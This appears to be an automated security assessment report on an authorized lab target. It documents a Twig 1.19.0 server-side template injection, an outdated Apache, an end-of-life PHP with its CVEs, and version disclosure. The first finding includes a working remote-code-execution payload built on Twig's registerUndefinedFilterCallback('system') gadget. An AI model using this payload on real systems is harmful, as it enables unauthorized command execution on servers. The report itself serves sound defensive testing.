# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce Server-Side Template Injection (SSTI → RCE) via `name` parameter](#finding-1)
    - [2. HIGH — vulnerable-component Outdated Apache httpd 2.4.56 — multiple known CVEs incl. mod_rewrite RCE (CVE-2024-38475)](#finding-2)
    - [3. MEDIUM — vulnerable-component End-of-life PHP 8.0.30 — unsupported since 2023-11, multiple unpatched post-EOL CVEs](#finding-3)
    - [4. LOW — info-disclosure Technology version disclosure: Twig 1.19.0 and extension list exposed in every response](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqzcdsvg-n9md7u` |
| Target | http://target.local:8080/ |
| Started | 2026-06-29T14:57:46.636Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:8080`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 1 critical, 1 high, 1 medium, 1 low

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] Server-Side Template Injection (SSTI → RCE) via `name` parameter

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

The `name` POST parameter is passed directly into a Twig 1.19.0 template without sanitization. Template expressions in user input are evaluated server-side: `{{7*7}}` produces "49 is in stock!" instead of reflecting the literal string. Twig 1.x SSTI is exploitable for RCE via the filter-callback gadget: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`. The application also leaks the Twig version and loaded extensions on every response, aiding exploit development.

**Reproduction**

```
1. POST to http://target.local:8080/ with Content-Type: application/x-www-form-urlencoded\n2. Body: name={{7*7}}\n3. Response body contains "49 is in stock!" — server evaluated the template expression.\n4. Confirm with: name={{range(1,20)|join(',')}} → "1,2,3,...,20 is in stock!"\n5. Escalate to RCE: name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

**Evidence**

- Evidence `ev-mqzcmnyy-e` — `artifacts/s-0001/ev-mqzcmnyy-e/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 324
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:04:39 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>Submit a username</title>
</head>
<body>
    <h3>Check article availability. Type the name or model. </h3>
    <form action="" method="POST">        
        <input type="text" id="name" name="name" required>
        <button type="submit">Submit</button>
    </form>

</body>
</html>
```

- Evidence `ev-mqzciqyo-7` — `artifacts/s-0001/ev-mqzciqyo-7/`

Request:

```http
POST / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

name=%7B%7B7*7%7D%7D
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 175
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:01:37 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<strong>49 is in stock! Come back and test another one. </strong><br/>Twig version: 1.19.0<br/>Loaded extension: core, escaper, optimizer<br/><br/><a href="index.php">Back</a>
```

- Evidence `ev-mqzcn9te-g` — `artifacts/s-0001/ev-mqzcn9te-g/`

Request:

```http
POST / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

name=%7B%7B7*7%7D%7D
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 175
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:05:08 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<strong>49 is in stock! Come back and test another one. </strong><br/>Twig version: 1.19.0<br/>Loaded extension: core, escaper, optimizer<br/><br/><a href="index.php">Back</a>
```

<a id="finding-2"></a>

### 2. [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.56 — multiple known CVEs incl. mod_rewrite RCE (CVE-2024-38475)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

VERSION-BASED finding (matched by banner, NOT exploited): the server identifies itself as `Apache/2.4.56 (Debian)` in the `Server` response header, and the same string is printed in the default 404 error page footer (`Apache/2.4.56 (Debian) Server at target.local Port 8080`). Apache httpd 2.4.56 was released 2023-03 and is missing ~18+ months of security patches. Known CVEs fixed in later 2.4.x releases that therefore affect 2.4.56:
- CVE-2024-38475 (fixed 2.4.60): mod_rewrite improper escaping of output allows mapping URLs to unintended filesystem locations — unauthorized file access / source disclosure / possible RCE where rewrite rules expose executable paths. Worst-case of this set (High/Critical).
- CVE-2024-38476 (fixed 2.4.60): responses from backends can be mishandled → SSRF / information disclosure / potential code execution (High).
- CVE-2024-27316 (fixed 2.4.59): HTTP/2 CONTINUATION-frame flood → memory exhaustion DoS (High, 7.5).
- CVE-2023-38709 (fixed 2.4.59): HTTP response splitting via malformed backend response headers (High, 7.3).
- CVE-2023-45802 (fixed 2.4.58): HTTP/2 stream-reset memory leak DoS (Medium).
Severity set HIGH by the worst issue (mod_rewrite RCE-class CVE-2024-38475). CAVEAT: the mod_rewrite/mod_proxy/HTTP-2 CVEs depend on those modules being enabled/configured; this finding is by banner only and was not actively exploited — operator should confirm module config and patch to a current 2.4.x.

**Reproduction**

```
1. Send `GET /` (or any request) to http://target.local:8080/ and read the `Server` response header → `Apache/2.4.56 (Debian)` (evidence ev-mqzcu6x4-z, ev-mqzcu7lj-10).
2. Cross-check: request a nonexistent path; the default 404 page footer also prints `Apache/2.4.56 (Debian) Server at target.local Port 8080` (evidence ev-mqzcu8cv-11).
3. Map 2.4.56 against the Apache httpd CHANGES/security list → CVE-2024-38475/38476 (2.4.60), CVE-2024-27316 (2.4.59), CVE-2023-38709 (2.4.59), CVE-2023-45802 (2.4.58) all post-date 2.4.56.
```

**Evidence**

- Evidence `ev-mqzcu8cv-11` — `artifacts/_/ev-mqzcu8cv-11/`

Request:

```http
GET /verdict-nonexistent-a06-control HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 278
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 15:10:32 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.56 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.56 (Debian) Server at target.local Port 8080</address>
</body></html>
```

- Evidence `ev-mqzcu6x4-z` — `artifacts/_/ev-mqzcu6x4-z/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 324
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:10:31 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>Submit a username</title>
</head>
<body>
    <h3>Check article availability. Type the name or model. </h3>
    <form action="" method="POST">        
        <input type="text" id="name" name="name" required>
        <button type="submit">Submit</button>
    </form>

</body>
</html>
```

- Evidence `ev-mqzcu7lj-10` — `artifacts/_/ev-mqzcu7lj-10/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 324
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:10:31 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>Submit a username</title>
</head>
<body>
    <h3>Check article availability. Type the name or model. </h3>
    <form action="" method="POST">        
        <input type="text" id="name" name="name" required>
        <button type="submit">Submit</button>
    </form>

</body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] End-of-life PHP 8.0.30 — unsupported since 2023-11, multiple unpatched post-EOL CVEs

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

VERSION-BASED finding (matched by banner, NOT exploited): the application discloses `X-Powered-By: PHP/8.0.30` on `/` and `/index.php`. PHP 8.0.30 (released 2023-07) is the FINAL release of the 8.0 branch; PHP 8.0 reached END OF LIFE on 2023-11-26 and receives NO further security fixes. As of 2026-06 it is ~2.5 years past EOL. Security fixes shipped to the still-supported branches (8.1/8.2/8.3+) after EOL were never backported to 8.0.30, so this build is permanently exposed to, among others:
- CVE-2024-3096: password_verify() can return true for certain inputs containing a NUL byte against some BCrypt hashes — authentication-relevant (Medium).
- CVE-2024-2756: Set-Cookie handling lets the `__Host-`/`__Secure-` cookie-name-prefix protection be bypassed via line folding (Medium).
- CVE-2024-8929: mysqlnd can leak heap memory contents to a malicious/MITM MySQL server (Medium).
- CVE-2024-5458: filter_var(FILTER_VALIDATE_URL) parsing bypass (Low/Medium).
Headline issue is the unsupported/EOL status plus this accumulating set of unpatched CVEs. NOTE on scope: CVE-2024-4577 (php-cgi argument-injection RCE, Critical) is WINDOWS-ONLY and does NOT apply to this Debian host, so it is deliberately excluded. Severity set MEDIUM (EOL + medium-class Linux CVEs, including the auth-relevant password_verify bypass); no confirmed Linux RCE for this exact build. By banner only — not actively exploited. Remediation: migrate to a supported PHP branch (8.3/8.4) and suppress `expose_php`.

**Reproduction**

```
1. Send `GET /` and `GET /index.php` to http://target.local:8080/ and read the `X-Powered-By` response header → `PHP/8.0.30` (evidence ev-mqzcu6x4-z, ev-mqzcu7lj-10).
2. Negative control: a 404 response (ev-mqzcu8cv-11) — distinguishable status/length.
3. PHP release calendar: 8.0 EOL 2023-11-26; 8.0.30 is the last 8.0 release. Post-EOL CVEs (CVE-2024-3096, CVE-2024-2756, CVE-2024-8929, CVE-2024-5458) were fixed only in 8.1+/8.2+/8.3+ and remain unpatched here.
```

**Evidence**

- Evidence `ev-mqzcu8cv-11` — `artifacts/_/ev-mqzcu8cv-11/`

Request:

```http
GET /verdict-nonexistent-a06-control HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 278
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 15:10:32 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.56 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.56 (Debian) Server at target.local Port 8080</address>
</body></html>
```

- Evidence `ev-mqzcu6x4-z` — `artifacts/_/ev-mqzcu6x4-z/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 324
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:10:31 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>Submit a username</title>
</head>
<body>
    <h3>Check article availability. Type the name or model. </h3>
    <form action="" method="POST">        
        <input type="text" id="name" name="name" required>
        <button type="submit">Submit</button>
    </form>

</body>
</html>
```

- Evidence `ev-mqzcu7lj-10` — `artifacts/_/ev-mqzcu7lj-10/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 324
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:10:31 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>Submit a username</title>
</head>
<body>
    <h3>Check article availability. Type the name or model. </h3>
    <form action="" method="POST">        
        <input type="text" id="name" name="name" required>
        <button type="submit">Submit</button>
    </form>

</body>
</html>
```

<a id="finding-4"></a>

### 4. [LOW] [info-disclosure] Technology version disclosure: Twig 1.19.0 and extension list exposed in every response

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

Every POST response to the form includes the exact Twig template-engine version (`Twig version: 1.19.0`) and the list of loaded extensions (`core, escaper, optimizer`) in the HTML body. This information is absent from the GET form page. Exposing the precise engine version allows an attacker to immediately confirm SSTI exploitability without additional fingerprinting.

**Reproduction**

```
1. POST to http://target.local:8080/ with any name value (e.g. name=test)\n2. Response body always contains: "Twig version: 1.19.0\nLoaded extension: core, escaper, optimizer"\n3. Compare with GET / which returns only the form HTML (no version info).
```

**Evidence**

- Evidence `ev-mqzcmnyy-e` — `artifacts/s-0001/ev-mqzcmnyy-e/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 324
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:04:39 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>Submit a username</title>
</head>
<body>
    <h3>Check article availability. Type the name or model. </h3>
    <form action="" method="POST">        
        <input type="text" id="name" name="name" required>
        <button type="submit">Submit</button>
    </form>

</body>
</html>
```

- Evidence `ev-mqzciqyo-7` — `artifacts/s-0001/ev-mqzciqyo-7/`

Request:

```http
POST / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

name=%7B%7B7*7%7D%7D
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 175
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:01:37 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<strong>49 is in stock! Come back and test another one. </strong><br/>Twig version: 1.19.0<br/>Loaded extension: core, escaper, optimizer<br/><br/><a href="index.php">Back</a>
```

- Evidence `ev-mqzcn9te-g` — `artifacts/s-0001/ev-mqzcn9te-g/`

Request:

```http
POST / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

name=%7B%7B7*7%7D%7D
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 175
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 15:05:08 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<strong>49 is in stock! Come back and test another one. </strong><br/>Twig version: 1.19.0<br/>Loaded extension: core, escaper, optimizer<br/><br/><a href="index.php">Back</a>
```
